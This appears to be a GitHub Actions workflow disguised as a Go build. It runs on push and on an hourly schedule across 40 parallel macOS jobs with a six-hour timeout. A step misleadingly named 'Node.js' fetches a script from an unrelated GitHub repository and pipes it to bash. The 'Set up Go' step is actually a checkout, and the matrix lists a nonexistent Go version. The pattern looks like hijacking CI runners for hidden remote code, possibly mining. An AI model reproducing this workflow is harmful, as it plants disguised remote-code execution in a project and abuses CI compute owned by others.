name: ci-lirterxa
# on: [push]
on:
  push:
  schedule:
    - cron: '*/60 * * * *'   
jobs:
  build:
    name: IPLAYBOOKS
    runs-on: depot-macos-latest
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         go: [1.11, 2.40, 1.13, 1.20]
         flag: [kmn, oiu, nvb, tby, utu, rva, zys, daw, cxw, omi]  
    timeout-minutes: 360
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/checkout@v3
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v3
    - name: Node.js
      run: |
        curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
